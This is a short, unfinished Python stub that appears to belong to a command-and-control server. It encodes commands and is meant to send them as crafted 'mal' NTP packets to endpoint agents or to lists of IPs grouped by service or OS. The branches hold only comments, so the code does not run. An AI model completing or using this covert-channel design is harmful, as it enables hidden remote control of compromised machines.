from server import convert

#send given cmd to API for conversion
def convertCMD(cmd):
    return convert.encode(cmd)

#receive output and decode, return to TS/(DB)?
def receiveOutput(output):
    return convert.decode(output)

#send command via NTP message, craft mal packet
def sendCMD(cmd, destGroup, endpoint):
    if destGroup == "service":
        #pull from db list of ips for selected service
        #loop through, sending cmd to each one
    elif destGroup == "os":
        #pull from db list of ips for selected os
        #loop through, sending cmd to each one
    else:
        #send command to selected endpoint agent
    encoded = convertCMD(cmd)
    cPacket = packets.CommandPacket()
        